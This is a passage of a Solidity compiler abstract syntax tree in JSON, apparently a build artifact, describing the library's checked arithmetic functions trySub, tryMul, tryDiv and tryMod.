															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 53,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1241:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 54,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 36,
																"src": "1247:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 55,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 38,
																"src": "1251:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1247:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 57,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1240:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 44,
												"id": 58,
												"nodeType": "Return",
												"src": "1233:20:0"
											}
										]
									},
									"documentation": {
										"id": 34,
										"nodeType": "StructuredDocumentation",
										"src": "969:135:0",
										"text": " @dev Returns the substraction of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 60,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 39,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 36,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1125:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 35,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1125:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 38,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1136:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 37,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1136:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1124:22:0"
									},
									"returnParameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1170:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 40,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1170:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 43,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1176:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 42,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1176:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1169:15:0"
									},
									"scope": 354,
									"src": "1109:151:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 100,
										"nodeType": "Block",
										"src": "1484:359:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 74,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 72,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 63,
														"src": "1716:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 73,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1721:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1716:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 79,
												"nodeType": "IfStatement",
												"src": "1712:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "74727565",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1732:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 76,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1738:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 77,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1731:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 71,
													"id": 78,
													"nodeType": "Return",
													"src": "1724:16:0"
												}
											},
											{
												"assignments": [
													81
												],
												"declarations": [
													{
														"constant": false,
														"id": 81,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 100,
														"src": "1750:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 80,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1750:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 85,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 82,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 63,
														"src": "1762:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 83,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 65,
														"src": "1766:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1762:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1750:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 90,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 88,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 86,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "1781:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 87,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 63,
															"src": "1785:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1781:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 89,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 65,
														"src": "1790:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1781:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 95,
												"nodeType": "IfStatement",
												"src": "1777:33:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 91,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1801:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 92,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1808:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 93,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1800:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 71,
													"id": 94,
													"nodeType": "Return",
													"src": "1793:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 96,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1828:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 97,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "1834:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 98,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1827:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 71,
												"id": 99,
												"nodeType": "Return",
												"src": "1820:16:0"
											}
										]
									},
									"documentation": {
										"id": 61,
										"nodeType": "StructuredDocumentation",
										"src": "1266:137:0",
										"text": " @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 101,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 63,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1424:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 62,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1424:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1435:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 64,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1435:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1423:22:0"
									},
									"returnParameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 68,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1469:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 67,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1469:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 70,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1475:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 69,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1475:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1468:15:0"
									},
									"scope": 354,
									"src": "1408:435:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 127,
										"nodeType": "Block",
										"src": "2068:76:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 113,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 106,
														"src": "2082:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 114,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2087:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2082:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 120,
												"nodeType": "IfStatement",
												"src": "2078:29:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 116,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2098:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2105:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 118,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2097:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 112,
													"id": 119,
													"nodeType": "Return",
													"src": "2090:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 121,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2125:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 124,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 122,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "2131:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"id": 123,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 106,
																"src": "2135:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2131:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 125,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2124:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 112,
												"id": 126,
												"nodeType": "Return",
												"src": "2117:20:0"
											}
										]
									},
									"documentation": {
										"id": 102,
										"nodeType": "StructuredDocumentation",
										"src": "1849:138:0",
										"text": " @dev Returns the division of two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 128,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 107,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 104,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2008:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 103,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2008:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 106,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2019:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 105,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2019:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2007:22:0"
									},
									"returnParameters": {
										"id": 112,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 109,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2053:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 108,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2053:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 111,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2059:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 110,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2059:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2052:15:0"
									},
									"scope": 354,
									"src": "1992:152:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 154,
										"nodeType": "Block",
										"src": "2379:76:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 142,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 140,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 133,
														"src": "2393:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 141,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2398:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2393:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 147,
												"nodeType": "IfStatement",
												"src": "2389:29:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 143,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2409:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 144,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2416:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 145,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2408:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 139,
													"id": 146,
													"nodeType": "Return",
													"src": "2401:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 148,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2436:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 151,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 149,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 131,
																"src": "2442:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"id": 150,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 133,
																"src": "2446:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2442:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 152,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2435:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 139,
												"id": 153,
												"nodeType": "Return",
												"src": "2428:20:0"
											}
										]
									},
									"documentation": {
										"id": 129,
										"nodeType": "StructuredDocumentation",
										"src": "2150:148:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 155,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 134,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 131,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2319:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 130,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2319:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 133,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2330:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 132,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2330:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2318:22:0"
									},
									"returnParameters": {
										"id": 139,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 136,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2364:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 135,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2364:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 138,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2370:7:0",
												"stateVariable": false,
